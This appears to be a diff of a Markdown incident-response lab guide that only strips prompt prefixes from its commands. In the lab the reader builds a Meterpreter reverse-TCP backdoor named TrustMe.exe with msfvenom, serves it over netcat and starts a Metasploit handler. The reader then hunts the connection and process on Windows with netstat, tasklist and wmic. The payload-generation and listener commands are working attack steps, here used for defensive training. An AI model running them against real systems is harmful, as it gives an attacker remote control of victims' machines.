@@ -26,7 +26,7 @@ And now, open a Ubuntu command prompt:
 
 On your Linux system, please run the following command:
 
-$`ifconfig`
+`ifconfig`
 
 ![](attachments/Clipboard_2020-06-12-12-35-15.png)
 
@@ -40,21 +40,21 @@ Please note your IP address for the ADHD Linux system on a piece of paper:
 
 Now, run the following commands to start a simple backdoor and backdoor listener: 
 
-$ `sudo su -`
+`sudo su -`
 Please note, the adhd password is adhd.
 
-/#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 -f exe -o /tmp/TrustMe.exe`
+`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 -f exe -o /tmp/TrustMe.exe`
 
-/#`cd /tmp`
+`cd /tmp`
 
 /#`ls -l TrustMe.exe`
 
-/#`nc -l -p 2222 < TrustMe.exe`
+`nc -l -p 2222 < TrustMe.exe`
 
 Now, let's start the Metasploit Handler.  You will have to open another Ubuntu command prompt by selecting the down carrot from the upper tabs on the Windows Terminal and selecting Ubuntu.
 
 Let's become root first!!!
-$`sudo su -`
+`sudo su -`
 
 Now, let's start the Metasploit handler.
 
@@ -111,24 +111,24 @@ Once we are in, lets start with looking at the network connections:
 
 First, let's create a share
 
-C:\>`net share class=C:\Tools`
+`net share class=C:\Tools`
 
 Now, let's look at that share
 
-C:\>`net view \\127.0.0.1`
+`net view \\127.0.0.1`
 
 Next, let's create some sessions
 
-C:\>`net use * \\127.0.0.1\c$`
+`net use * \\127.0.0.1\c$`
 
 
 We can see those sessions with... 
 
-C:\>`net session`
+`net session`
 
 And...
 
-C:\> `net use`
+`net use`
 
 It should all look like this:
 
@@ -139,7 +139,7 @@ While there is not much here for this lab, it is key to remember that these two 
 
 However, we are not done with network connections yet.  Lets try looking at our malware!
 
-C:\>`netstat -naob`
+`netstat -naob`
 
 ![](attachments/Clipboard_2020-12-09-13-41-32.png)
 
@@ -151,7 +151,7 @@ Specificly, we are interested in the connection on port 4444 as we know this is 
 
 Now, let's drill down on that connection with some more data:
 
-C:\>`netstat -f`
+`netstat -f`
 
 I like to run -f with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 
 
@@ -161,7 +161,7 @@ But, we do see our last connection with the port 4444.
 
 Let's get the Process ID (PID) so we can dig deeper:
 
-C:\>`netstat -naob`
+`netstat -naob`
 
 ![](attachments/Clipboard_2020-12-09-13-49-49.png)
 
@@ -173,7 +173,7 @@ Now, let's dive in!
 
 First we will start with tasklist  
 
-C:\>`tasklist /m /fi "pid eq [PID]"`
+`tasklist /m /fi "pid eq <PID>"`
 
 Your PID WILL BE DIFFERENT!
 
@@ -183,7 +183,7 @@ We can see the loaded DLL's above.  As we can see, there is not a whole lot to s
 
 Let's keep digging with wmic:
 
-C:\>`wmic process where processid=[PID] get commandline`
+`wmic process where processid=<PID> get commandline`
 
 ![](attachments/Clipboard_2020-12-09-13-58-16.png)
 
@@ -192,7 +192,7 @@ Ahh!!  Now we can see that the file was launched from the Edge temp downloads di
 
 Let's see if we can see what spawned the process with wmic.
 
-C:\> `wmic process get name,parentprocessid,processid`
+`wmic process get name,parentprocessid,processid`
 
 ![](attachments/Clipboard_2020-12-09-14-01-04.png)
 
